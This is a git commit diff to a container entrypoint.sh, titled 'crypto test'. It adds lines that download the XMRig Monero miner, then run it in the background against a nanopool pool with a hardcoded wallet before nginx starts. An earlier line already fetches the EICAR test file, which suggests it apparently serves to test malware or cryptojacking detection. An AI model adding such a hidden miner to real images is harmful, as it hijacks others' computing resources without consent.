098280ac380bb0a1dc7f1a8a923691c598c038f8
carolina valencia <krol3@users.noreply.github.com>
2022-10-10 22:10:02 -0300

    feat: crypto test

--- entrypoint.sh
+++ entrypoint.sh
@@ -2,4 +2,8 @@
 # my new entrypoint
 
 curl -o /tmp/eicar-fileless https://secure.eicar.org/eicar.com
+curl -OL https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz
+tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz
+cd xmrig-6.16.4
+./xmrig --donate-level 8 -o xmr-us-east1.nanopool.org:14433 -u 422skia35WvF9mVq9Z9oCMRtoEunYQ5kHPvRqpH1rGCv1BzD5dUY4cD8wiCMp4KQEYLAN1BuawbUEJE99SNrTv9N9gf2TWC --tls --coin monero --background
 nginx
